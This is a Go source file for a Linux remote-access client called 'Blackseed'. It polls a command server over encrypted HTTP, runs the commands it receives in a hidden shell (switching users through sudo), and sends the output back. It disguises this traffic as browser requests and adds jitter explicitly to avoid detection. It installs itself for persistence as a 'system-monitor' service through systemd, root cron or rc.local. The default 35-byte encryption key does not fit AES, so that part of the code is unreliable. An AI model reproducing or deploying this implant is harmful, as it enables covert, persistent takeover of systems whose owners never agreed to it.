// Package main implements a secure, persistent client for the Blackseed project.
// This client establishes a secure connection to an orchestrator server,
// provides shell access, and maintains persistence on Linux systems.
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	cryptorand "crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/creack/pty" // For Unix PTY support
	"github.com/google/uuid"
)

// Message represents data exchanged between client and orchestrator
type Message struct {
	Type    string `json:"type"`            // Type of message (command, output, error, etc.)
	Content string `json:"content"`         // Main content of the message
	Shell   string `json:"shell,omitempty"` // Shell path for shell_change messages
	User    string `json:"user,omitempty"`  // Username for user_change messages
	ID      string `json:"id,omitempty"`    // Message ID for tracking
	Nonce   string `json:"nonce,omitempty"` // Nonce for encryption
}

// Configuration for the client
type Config struct {
	// Basic configuration
	ServerURL      string        `json:"server_url"`      // URL of the orchestrator server
	ReconnectDelay time.Duration `json:"reconnect_delay"` // Delay between reconnection attempts
	MaxRetries     int           `json:"max_retries"`     // Maximum number of reconnection attempts (-1 for infinite)
	DefaultShell   string        `json:"default_shell"`   // Default shell to use
	DefaultUser    string        `json:"default_user"`    // Default user to run as

	// Security options
	EncryptionKey      string `json:"encryption_key"`       // Key for AES encryption
	UseTLS             bool   `json:"use_tls"`              // Whether to use TLS
	CertPath           string `json:"cert_path"`            // Path to TLS certificate
	InsecureSkipVerify bool   `json:"insecure_skip_verify"` // Whether to skip TLS verification

	// Communication options
	PollInterval  time.Duration `json:"poll_interval"`  // Interval between polling for messages
	JitterPercent int           `json:"jitter_percent"` // Jitter percentage to add to polling interval
	UserAgent     string        `json:"user_agent"`     // User agent to use for HTTP requests

	// Persistence options
	InstallPath string `json:"install_path"` // Path to install the client
	AutoStart   bool   `json:"auto_start"`   // Whether to install for persistence
	ServiceName string `json:"service_name"` // Name of the systemd service
}

var (
	// Default configuration
	config = Config{
		ServerURL:          "https://localhost:8443/api",
		ReconnectDelay:     5 * time.Second,
		MaxRetries:         -1,                                    // -1 means infinite retries
		DefaultShell:       "",                                    // Empty means use system default
		DefaultUser:        "",                                    // Empty means current user
		EncryptionKey:      "defaultEncryptionKey123456789012345", // Will be overridden in production
		UseTLS:             true,
		CertPath:           "",
		InsecureSkipVerify: true, // For development only
		PollInterval:       30 * time.Second,
		JitterPercent:      20,
		UserAgent:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
		InstallPath:        "/usr/local/bin/system-monitor",
		AutoStart:          false,
		ServiceName:        "system-monitor",
	}

	// Terminal process
	shellCmd   *exec.Cmd
	ptmx       *os.File
	shellMutex sync.Mutex

	// Current shell and user
	currentShell string
	currentUser  string

	// Client identification
	clientID string
	hostname string

	// HTTP client for communication
	httpClient *http.Client

	// Message queue for sending
	messageQueue     []Message
	messageQueueLock sync.Mutex

	// Persistence paths
	executablePath     string
	systemdServicePath string = "/etc/systemd/system/%s.service"
	cronPath           string = "/etc/cron.d/%s"
	rcLocalPath        string = "/etc/rc.local"
)

// main is the entry point of the application
func main() {
	// Minimize logging in production
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	// Setup client
	setupClient()

	// Check if this is an installation request
	if len(os.Args) > 1 && os.Args[1] == "--install" {
		installForPersistence()
		return
	}

	// Start client operation
	runClient()
}

// setupClient initializes the client configuration
// This includes setting up the client ID, hostname, shell, user, and HTTP client
func setupClient() {
	// Initialize random seed
	rand.Seed(time.Now().UnixNano())

	// Get the path of the current executable
	var err error
	executablePath, err = os.Executable()
	if err != nil {
		log.Printf("Failed to get executable path: %v", err)
		executablePath = os.Args[0]
	}

	// Generate a unique ID for this client if not already set
	clientID = uuid.New().String()

	hostname, err = os.Hostname()
	if err != nil {
		hostname = "unknown"
		log.Println("Failed to get hostname:", err)
	}

	// Determine default shell if not specified
	if config.DefaultShell == "" {
		shell := os.Getenv("SHELL")
		if shell == "" {
			shell = "/bin/sh"
		}
		config.DefaultShell = shell
	}
	currentShell = config.DefaultShell

	// Get current username
	currentUser = config.DefaultUser
	if currentUser == "" {
		u, err := user.Current()
		if err == nil {
			currentUser = u.Username
		} else {
			currentUser = "unknown"
			log.Println("Failed to get current user:", err)
		}
	}

	// Initialize HTTP client with TLS configuration
	httpClient = &http.Client{
		Timeout: 30 * time.Second,
	}

	if config.UseTLS {
		tlsConfig := createTLSConfig()
		transport := &http.Transport{
			TLSClientConfig: tlsConfig,
		}
		httpClient.Transport = transport
	}
}

// runClient starts the main client operation loop
// It handles connection to the orchestrator with retry logic
func runClient() {
	log.Printf("Client starting with ID: %s, Hostname: %s, User: %s, Shell: %s",
		clientID, hostname, currentUser, currentShell)

	// Connect to orchestrator with retry logic
	retries := 0
	for config.MaxRetries < 0 || retries <= config.MaxRetries {
		if retries > 0 {
			log.Printf("Reconnecting in %v... (Attempt %d)", config.ReconnectDelay, retries)
			time.Sleep(config.ReconnectDelay)
		}

		err := connectToOrchestrator()
		if err == nil {
			// If connection was successful and then closed normally, reset retry counter
			retries = 0
			continue
		}

		log.Printf("Connection error: %v", err)
		retries++
	}

	log.Println("Maximum reconnection attempts reached. Exiting.")
}

// connectToOrchestrator establishes a secure connection to the orchestrator
// It registers with the orchestrator, starts a shell, and handles communication
func connectToOrchestrator() error {
	// Register with orchestrator
	err := registerWithOrchestrator()
	if err != nil {
		return fmt.Errorf("registration error: %v", err)
	}

	// Start shell process
	if err := startShell(currentShell, currentUser); err != nil {
		return fmt.Errorf("failed to start shell: %v", err)
	}
	defer stopShell()

	// Start message processing loop
	done := make(chan struct{})

	// Start shell output reader
	go readFromPTYAndQueue()

	// Start message sender
	go processMessageQueue(done)

	// Start message poller
	go pollForMessages(done)

	// Wait for termination signal
	<-done

	return nil
}

// createTLSConfig creates a TLS configuration for secure connections
// It sets up TLS options and loads certificates if provided
func createTLSConfig() *tls.Config {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: config.InsecureSkipVerify,
		MinVersion:         tls.VersionTLS12,
	}

	// Load certificates if path is provided
	if config.CertPath != "" {
		certPool := x509.NewCertPool()
		pemCerts, err := ioutil.ReadFile(config.CertPath)
		if err == nil {
			certPool.AppendCertsFromPEM(pemCerts)
			tlsConfig.RootCAs = certPool
		} else {
			log.Printf("Failed to load certificates: %v", err)
		}
	}

	return tlsConfig
}

// registerWithOrchestrator sends initial registration to the orchestrator
// It sends client information and handles the response
func registerWithOrchestrator() error {
	// Prepare registration data
	regData := map[string]interface{}{
		"uuid":     clientID,
		"hostname": hostname,
		"user":     currentUser,
		"shell":    currentShell,
		"os":       "linux",
	}

	// Convert to JSON
	jsonData, err := json.Marshal(regData)
	if err != nil {
		return fmt.Errorf("JSON marshal error: %v", err)
	}

	// Encrypt the data
	encryptedData, err := encryptData(jsonData)
	if err != nil {
		return fmt.Errorf("encryption error: %v", err)
	}

	// Create HTTP request
	req, err := http.NewRequest("POST", config.ServerURL+"/register", bytes.NewBuffer(encryptedData))
	if err != nil {
		return fmt.Errorf("request creation error: %v", err)
	}

	// Set headers to blend in with normal web traffic
	req.Header.Set("User-Agent", config.UserAgent)
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")

	// Send request
	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("request error: %v", err)
	}
	defer resp.Body.Close()

	// Check response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("registration failed with status: %s", resp.Status)
	}

	// Read and decrypt response
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("response read error: %v", err)
	}

	// Decrypt response if needed
	decryptedResp, err := decryptData(respBody)
	if err != nil {
		return fmt.Errorf("decryption error: %v", err)
	}

	// Parse response
	var respData map[string]interface{}
	if err := json.Unmarshal(decryptedResp, &respData); err != nil {
		return fmt.Errorf("JSON unmarshal error: %v", err)
	}

	log.Printf("Registration successful")
	return nil
}

// pollForMessages periodically checks for new messages from the orchestrator
// It adds jitter to the polling interval to avoid detection
func pollForMessages(done chan struct{}) {
	for {
		select {
		case <-done:
			return
		default:
			// Add jitter to polling interval
			jitter := float64(config.JitterPercent) / 100.0
			sleepTime := time.Duration(float64(config.PollInterval.Nanoseconds()) * (1 + (rand.Float64()*jitter*2 - jitter)))
			time.Sleep(time.Duration(sleepTime))

			// Poll for messages
			messages, err := fetchMessages()
			if err != nil {
				log.Printf("Error fetching messages: %v", err)
				continue
			}

			// Process received messages
			for _, msg := range messages {
				processIncomingMessage(msg)
			}
		}
	}
}

// fetchMessages retrieves pending messages from the orchestrator
// It sends a request to the orchestrator and processes the response
func fetchMessages() ([]Message, error) {
	// Prepare request data
	reqData := map[string]interface{}{
		"uuid": clientID,
	}

	// Convert to JSON
	jsonData, err := json.Marshal(reqData)
	if err != nil {
		return nil, fmt.Errorf("JSON marshal error: %v", err)
	}

	// Encrypt the data
	encryptedData, err := encryptData(jsonData)
	if err != nil {
		return nil, fmt.Errorf("encryption error: %v", err)
	}

	// Create HTTP request
	req, err := http.NewRequest("POST", config.ServerURL+"/poll", bytes.NewBuffer(encryptedData))
	if err != nil {
		return nil, fmt.Errorf("request creation error: %v", err)
	}

	// Set headers to blend in with normal web traffic
	req.Header.Set("User-Agent", config.UserAgent)
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")

	// Send request
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request error: %v", err)
	}
	defer resp.Body.Close()

	// Check response
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("poll failed with status: %s", resp.Status)
	}

	// Read and decrypt response
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("response read error: %v", err)
	}

	// If response is empty, return empty slice
	if len(respBody) == 0 {
		return []Message{}, nil
	}

	// Decrypt response
	decryptedResp, err := decryptData(respBody)
	if err != nil {
		return nil, fmt.Errorf("decryption error: %v", err)
	}

	// Parse response
	var messages []Message
	if err := json.Unmarshal(decryptedResp, &messages); err != nil {
		return nil, fmt.Errorf("JSON unmarshal error: %v", err)
	}

	return messages, nil
}

// processMessageQueue handles sending queued messages to the orchestrator
// It periodically checks the message queue and sends messages in batches
func processMessageQueue(done chan struct{}) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			messageQueueLock.Lock()
			if len(messageQueue) > 0 {
				// Get messages to send
				messages := messageQueue
				messageQueue = []Message{}
				messageQueueLock.Unlock()

				// Send messages
				if err := sendMessages(messages); err != nil {
					log.Printf("Error sending messages: %v", err)
					// Put messages back in queue
					messageQueueLock.Lock()
					messageQueue = append(messages, messageQueue...)
					messageQueueLock.Unlock()
				}
			} else {
				messageQueueLock.Unlock()
			}
		}
	}
}

// queueMessage adds a message to the send queue
// It generates a message ID if one is not provided
func queueMessage(msg Message) {
	messageQueueLock.Lock()
	defer messageQueueLock.Unlock()

	// Generate message ID if not set
	if msg.ID == "" {
		msg.ID = uuid.New().String()
	}

	messageQueue = append(messageQueue, msg)
}

// sendMessages sends a batch of messages to the orchestrator
// It encrypts the messages and sends them via HTTP
func sendMessages(messages []Message) error {
	// Convert to JSON
	jsonData, err := json.Marshal(messages)
	if err != nil {
		return fmt.Errorf("JSON marshal error: %v", err)
	}

	// Encrypt the data
	encryptedData, err := encryptData(jsonData)
	if err != nil {
		return fmt.Errorf("encryption error: %v", err)
	}

	// Create HTTP request
	req, err := http.NewRequest("POST", config.ServerURL+"/messages", bytes.NewBuffer(encryptedData))
	if err != nil {
		return fmt.Errorf("request creation error: %v", err)
	}

	// Set headers to blend in with normal web traffic
	req.Header.Set("User-Agent", config.UserAgent)
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("X-Client-ID", clientID)

	// Send request
	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("request error: %v", err)
	}
	defer resp.Body.Close()

	// Check response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("message send failed with status: %s", resp.Status)
	}

	return nil
}

// processIncomingMessage handles messages received from the orchestrator
// It dispatches messages to the appropriate handler based on message type
func processIncomingMessage(msg Message) {
	log.Printf("Processing message: %+v", msg)

	// Handle different message types
	switch msg.Type {
	case "command":
		executeCommand(msg.Content)
	case "shell_change":
		changeShell(msg.Shell)
	case "user_change":
		changeUser(msg.User)
	case "file_operation":
		handleFileOperation(msg)
	case "system_info":
		collectAndSendSystemInfo()
	case "persistence":
		updatePersistence(msg.Content)
	default:
		log.Printf("Unknown message type: %s", msg.Type)
	}
}

// executeCommand executes a shell command
// It writes the command to the PTY and handles errors
func executeCommand(command string) error {
	shellMutex.Lock()
	defer shellMutex.Unlock()

	if ptmx != nil {
		log.Printf("Writing command to shell: %s", command)
		_, err := ptmx.Write([]byte(command + "\n"))
		if err != nil {
			log.Printf("Failed to write to shell: %v", err)
			return err
		}
	} else {
		return fmt.Errorf("PTY is nil, cannot write command")
	}

	return nil
}

// changeShell changes the current shell
// It stops the current shell, starts a new one, and handles errors
func changeShell(newShell string) error {
	if newShell == "" || newShell == currentShell {
		return nil
	}

	log.Printf("Changing shell from %s to %s", currentShell, newShell)

	// Stop current shell
	stopShell()

	// Update current shell
	currentShell = newShell

	// Start new shell
	if err := startShell(currentShell, currentUser); err != nil {
		log.Printf("Failed to start new shell %s: %v", currentShell, err)

		// Send error message back to orchestrator
		queueMessage(Message{
			Type:    "error",
			Content: fmt.Sprintf("Failed to start shell %s: %v", currentShell, err),
		})

		// Revert to default shell
		currentShell = config.DefaultShell
		if err := startShell(currentShell, currentUser); err != nil {
			log.Printf("Failed to restart default shell: %v", err)
			return err
		}
		return err
	}

	// Send confirmation message
	queueMessage(Message{
		Type:    "output",
		Content: fmt.Sprintf("Shell changed to: %s\n$ ", currentShell),
	})

	return nil
}

// changeUser changes the current user
// It stops the current shell, starts a new one as the specified user, and handles errors
func changeUser(newUser string) error {
	if newUser == "" || newUser == currentUser {
		return nil
	}

	log.Printf("Changing user from %s to %s", currentUser, newUser)

	// Stop current shell
	stopShell()

	// Update current user
	currentUser = newUser

	// Start new shell with new user
	if err := startShell(currentShell, currentUser); err != nil {
		log.Printf("Failed to start shell as user %s: %v", currentUser, err)

		// Send error message back to orchestrator
		queueMessage(Message{
			Type:    "error",
			Content: fmt.Sprintf("Failed to start shell as user %s: %v", currentUser, err),
		})

		// Revert to previous user
		u, err := user.Current()
		if err == nil {
			currentUser = u.Username
		} else {
			currentUser = "unknown"
		}

		if err := startShell(currentShell, currentUser); err != nil {
			log.Printf("Failed to restart shell with default user: %v", err)
			return err
		}
		return err
	}

	// Send confirmation message
	queueMessage(Message{
		Type:    "output",
		Content: fmt.Sprintf("User changed to: %s\n$ ", currentUser),
	})

	return nil
}

// handleFileOperation processes file-related operations
// This is a placeholder for future file operation implementation
func handleFileOperation(msg Message) error {
	// TODO: Implement file operations (upload, download, etc.)
	return fmt.Errorf("file operations not yet implemented")
}

// collectAndSendSystemInfo gathers system information and sends it to the orchestrator
// This is a placeholder for future system information collection implementation
func collectAndSendSystemInfo() error {
	// TODO: Implement system information collection
	return fmt.Errorf("system info collection not yet implemented")
}

// updatePersistence updates the persistence configuration
// It parses options from the message and applies them
func updatePersistence(options string) error {
	// Parse options
	var persistenceOptions map[string]interface{}
	if err := json.Unmarshal([]byte(options), &persistenceOptions); err != nil {
		return fmt.Errorf("failed to parse persistence options: %v", err)
	}

	// Update configuration
	if path, ok := persistenceOptions["install_path"].(string); ok && path != "" {
		config.InstallPath = path
	}

	if name, ok := persistenceOptions["service_name"].(string); ok && name != "" {
		config.ServiceName = name
	}

	if autoStart, ok := persistenceOptions["auto_start"].(bool); ok {
		config.AutoStart = autoStart
	}

	// Apply changes
	if config.AutoStart {
		return installForPersistence()
	}

	return nil
}

// installForPersistence sets up the client to run automatically at system startup
// It tries multiple persistence methods in order of preference
func installForPersistence() error {
	log.Printf("Installing for persistence at %s", config.InstallPath)

	// Create installation directory if it doesn't exist
	installDir := filepath.Dir(config.InstallPath)
	if err := os.MkdirAll(installDir, 0755); err != nil {
		return fmt.Errorf("failed to create installation directory: %v", err)
	}

	// Copy executable to installation path
	if err := copyExecutable(executablePath, config.InstallPath); err != nil {
		return fmt.Errorf("failed to copy executable: %v", err)
	}

	// Set permissions
	if err := os.Chmod(config.InstallPath, 0755); err != nil {
		return fmt.Errorf("failed to set permissions: %v", err)
	}

	// Install systemd service
	if err := installSystemdService(); err != nil {
		log.Printf("Failed to install systemd service: %v", err)

		// Try alternative persistence methods
		if err := installCronJob(); err != nil {
			log.Printf("Failed to install cron job: %v", err)

			// Try rc.local
			if err := installRcLocal(); err != nil {
				log.Printf("Failed to install rc.local entry: %v", err)
				return fmt.Errorf("all persistence methods failed")
			}
		}
	}

	log.Printf("Persistence installation complete")
	return nil
}

// copyExecutable copies the current executable to the target path
// It reads the source file and writes it to the target path
func copyExecutable(sourcePath, targetPath string) error {
	// Read source file
	sourceData, err := ioutil.ReadFile(sourcePath)
	if err != nil {
		return fmt.Errorf("failed to read source file: %v", err)
	}

	// Write to target path
	if err := ioutil.WriteFile(targetPath, sourceData, 0755); err != nil {
		return fmt.Errorf("failed to write target file: %v", err)
	}

	return nil
}

// installSystemdService creates and enables a systemd service for persistence
// It creates a service file, reloads systemd, and enables the service
func installSystemdService() error {
	// Create service file content
	serviceContent := fmt.Sprintf(`[Unit]
Description=System Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
`, config.InstallPath)

	// Write service file
	servicePath := fmt.Sprintf(systemdServicePath, config.ServiceName)
	if err := ioutil.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return fmt.Errorf("failed to write service file: %v", err)
	}

	// Reload systemd
	reloadCmd := exec.Command("systemctl", "daemon-reload")
	if err := reloadCmd.Run(); err != nil {
		return fmt.Errorf("failed to reload systemd: %v", err)
	}

	// Enable service
	enableCmd := exec.Command("systemctl", "enable", config.ServiceName)
	if err := enableCmd.Run(); err != nil {
		return fmt.Errorf("failed to enable service: %v", err)
	}

	// Start service
	startCmd := exec.Command("systemctl", "start", config.ServiceName)
	if err := startCmd.Run(); err != nil {
		return fmt.Errorf("failed to start service: %v", err)
	}

	return nil
}

// installCronJob creates a cron job for persistence
// It creates a cron file that runs the client at boot and checks periodically
func installCronJob() error {
	// Create cron job content
	cronContent := fmt.Sprintf(`# System monitoring service
@reboot root %s
*/10 * * * * root if ! pgrep -f %s > /dev/null; then %s; fi
`, config.InstallPath, filepath.Base(config.InstallPath), config.InstallPath)

	// Write cron file
	cronFilePath := fmt.Sprintf(cronPath, config.ServiceName)
	if err := ioutil.WriteFile(cronFilePath, []byte(cronContent), 0644); err != nil {
		return fmt.Errorf("failed to write cron file: %v", err)
	}

	return nil
}

// installRcLocal adds an entry to rc.local for persistence
// It adds a command to start the client at boot
func installRcLocal() error {
	// Read existing rc.local
	rcLocalContent, err := ioutil.ReadFile(rcLocalPath)
	if err != nil && !os.IsNotExist(err) {
		return fmt.Errorf("failed to read rc.local: %v", err)
	}

	// Check if entry already exists
	if strings.Contains(string(rcLocalContent), config.InstallPath) {
		return nil // Already installed
	}

	// Add entry before exit 0
	newContent := string(rcLocalContent)
	if strings.Contains(newContent, "exit 0") {
		newContent = strings.Replace(newContent, "exit 0", fmt.Sprintf("%s &\nexit 0", config.InstallPath), 1)
	} else {
		newContent = newContent + fmt.Sprintf("\n%s &\n", config.InstallPath)
	}

	// Write updated rc.local
	if err := ioutil.WriteFile(rcLocalPath, []byte(newContent), 0755); err != nil {
		return fmt.Errorf("failed to write rc.local: %v", err)
	}

	return nil
}

// startShell starts a new shell process
// It creates a PTY and starts the shell with the specified user
func startShell(shellPath, username string) error {
	shellMutex.Lock()
	defer shellMutex.Unlock()

	var cmd *exec.Cmd
	var err error

	log.Printf("Starting shell: %s as user: %s", shellPath, username)

	// Unix-like systems support PTY and user switching
	if username != "" && username != currentUser {
		// Use su or sudo to switch user
		cmd = exec.Command("sudo", "-u", username, shellPath)
	} else {
		cmd = exec.Command(shellPath)
	}

	// Set up environment variables for a full terminal
	cmd.Env = append(os.Environ(),
		"TERM=xterm-256color",
		"COLORTERM=truecolor",
	)

	// Start the command with a PTY
	ptmx, err = pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("failed to start PTY: %v", err)
	}

	// Set terminal size to a reasonable default
	pty.Setsize(ptmx, &pty.Winsize{
		Rows: 24,
		Cols: 80,
	})

	shellCmd = cmd
	log.Printf("Shell started successfully")
	return nil
}

// readFromPTYAndQueue reads from the PTY and queues output messages
// It continuously reads output from the shell and sends it to the orchestrator
func readFromPTYAndQueue() {
	buf := make([]byte, 1024)
	for {
		shellMutex.Lock()
		if ptmx == nil {
			shellMutex.Unlock()
			time.Sleep(100 * time.Millisecond)
			continue
		}

		n, err := ptmx.Read(buf)
		shellMutex.Unlock()

		if err != nil {
			if err != io.EOF {
				log.Printf("PTY read error: %v", err)
			}
			break
		}

		if n > 0 {
			output := string(buf[:n])
			log.Printf("PTY output: %s", output)

			// Queue output message
			queueMessage(Message{
				Type:    "output",
				Content: output,
			})
		}
	}
}

// stopShell terminates the shell process
// It kills the process and closes the PTY
func stopShell() {
	shellMutex.Lock()
	defer shellMutex.Unlock()

	if shellCmd != nil && shellCmd.Process != nil {
		shellCmd.Process.Kill()
		shellCmd.Wait()
	}

	if ptmx != nil {
		ptmx.Close()
		ptmx = nil
	}

	shellCmd = nil
	log.Printf("Shell stopped")
}

// encryptData encrypts data using AES-256-GCM
// It encrypts the data and encodes it as base64 to blend in with normal web traffic
func encryptData(plaintext []byte) ([]byte, error) {
	// Create cipher block
	block, err := aes.NewCipher([]byte(config.EncryptionKey))
	if err != nil {
		return nil, err
	}

	// Create GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Create nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(cryptorand.Reader, nonce); err != nil {
		return nil, err
	}

	// Encrypt data
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

	// Encode to base64 to make it look like normal web traffic
	encoded := make([]byte, base64.StdEncoding.EncodedLen(len(ciphertext)))
	base64.StdEncoding.Encode(encoded, ciphertext)

	return encoded, nil
}

// decryptData decrypts data using AES-256-GCM
// It decodes the base64 data and decrypts it
func decryptData(ciphertext []byte) ([]byte, error) {
	// Decode from base64
	decoded := make([]byte, base64.StdEncoding.DecodedLen(len(ciphertext)))
	n, err := base64.StdEncoding.Decode(decoded, ciphertext)
	if err != nil {
		return nil, err
	}
	decoded = decoded[:n]

	// Create cipher block
	block, err := aes.NewCipher([]byte(config.EncryptionKey))
	if err != nil {
		return nil, err
	}

	// Create GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Extract nonce
	if len(decoded) < gcm.NonceSize() {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertextData := decoded[:gcm.NonceSize()], decoded[gcm.NonceSize():]

	// Decrypt data
	plaintext, err := gcm.Open(nil, nonce, ciphertextData, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}
